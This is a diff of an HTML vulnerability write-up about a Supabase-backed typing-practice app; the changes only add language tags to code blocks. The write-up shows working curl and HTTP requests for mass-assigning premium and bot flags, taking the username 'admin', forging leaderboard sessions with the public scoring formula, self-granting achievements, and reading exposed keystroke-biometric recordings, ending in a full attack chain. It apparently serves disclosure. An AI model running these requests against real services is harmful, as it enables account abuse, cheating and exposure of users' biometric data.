@@ -45,7 +45,7 @@
 
 <h2 id="mass-assign"><a href="#mass-assign">#</a> Profiles mass assignment</h2>
 <p>The RLS UPDATE policy on <code>profiles</code> restricts which <em>rows</em> you can modify but not which <em>columns</em>. Any authenticated user can set whatever they want on their own row:</p>
-<pre><code>curl -X PATCH "$SUPA/rest/v1/profiles?id=eq.$MY_ID" \
+<pre data-lang="bash"><code>curl -X PATCH "$SUPA/rest/v1/profiles?id=eq.$MY_ID" \
   -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN" \
   -d '{"is_plus":true,"is_bot":true,"longest_streak":999,
        "current_streak":365,"total_sessions":100}'
@@ -54,18 +54,18 @@
 
 <h2 id="username"><a href="#username">#</a> Username takeover</h2>
 <p>Same column-level gap. You can change your username to any unclaimed string — <code>admin</code>, <code>support</code>, <code>moderator</code> were all available. <code>username_changed_at</code> didn't update after the PATCH, so there's no cooldown either.</p>
-<pre><code>curl -X PATCH "$SUPA/rest/v1/profiles?id=eq.$MY_ID" \
+<pre data-lang="bash"><code>curl -X PATCH "$SUPA/rest/v1/profiles?id=eq.$MY_ID" \
   -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN" \
   -d '{"username":"admin"}'
 # HTTP 200 — "username":"admin"</code></pre>
 
 <h2 id="session-forge"><a href="#session-forge">#</a> Session forgery</h2>
 <p>Any authenticated user can POST sessions with forged WPM, accuracy, and score. A server-side trigger checks for score mismatches and sets <code>flagged_for_review: true</code>, but the session is still inserted and <code>total_sessions</code> still increments. The anti-cheat formula is in the public bundle:</p>
-<pre><code>function QC(nckpm, accuracy, perfect) {
+<pre data-lang="js"><code>function QC(nckpm, accuracy, perfect) {
   return round(nckpm^0.65 * accuracy^1.5 * 17.8 * (perfect ? 1.05 : 1));
 }</code></pre>
 <p>Compute a matching <code>deft_score</code> and the session passes unflagged:</p>
-<pre><code>POST /rest/v1/sessions
+<pre data-lang="http"><code>POST /rest/v1/sessions
   {"nckpm":600, "accuracy":97.5, "deft_score":1096, "tier":"ELITE"}
   -->  HTTP 201 — not flagged</code></pre>
 <p>Twenty forged sessions later my test account hit <strong>#1 on the Python leaderboard</strong> with a rolling average of 1027.75 (previous #1 was 961).</p>
@@ -73,7 +73,7 @@
 
 <h2 id="achievements"><a href="#achievements">#</a> Self-grant achievements</h2>
 <p><code>user_achievements</code> has no RLS on INSERT, and the <code>achievements</code> table is anon-readable, so every achievement ID is known. Grant yourself whatever:</p>
-<pre><code>POST /rest/v1/user_achievements
+<pre data-lang="http"><code>POST /rest/v1/user_achievements
   {"user_id":"&lt;self&gt;","achievement_id":"speed_80"}
 POST /rest/v1/user_achievements
   {"user_id":"&lt;self&gt;","achievement_id":"speed_100"}
@@ -90,12 +90,12 @@ POST /rest/v1/user_achievements
 <li><strong>sessions</strong> — 899 records. New columns: <code>flagged_for_review</code>, <code>flag_reason</code>, <code>moderator_note</code>. Anyone can see who's been flagged and why.</li>
 <li><strong>ghost_recordings</strong> — 827 keystroke-biometric recordings, joinable to <code>profiles(username)</code> and <code>snippets(content)</code> in one query.</li>
 </ul>
-<pre><code>curl "$SUPA/rest/v1/ghost_recordings?\
+<pre data-lang="bash"><code>curl "$SUPA/rest/v1/ghost_recordings?\
 select=user_id,profiles(username),snippets(content),recording_json&limit=10" \
   -H "apikey: $KEY"</code></pre>
 
 <h2 id="chain"><a href="#chain">#</a> Full chain</h2>
-<pre><code>1. Register account (no email confirmation, no rate limit)
+<pre data-lang="bash"><code>1. Register account (no email confirmation, no rate limit)
 2. PATCH profiles → is_plus, is_bot, streak=999
 3. POST user_achievements → speed_80, speed_100, anything
 4. Compute matching score from the public formula
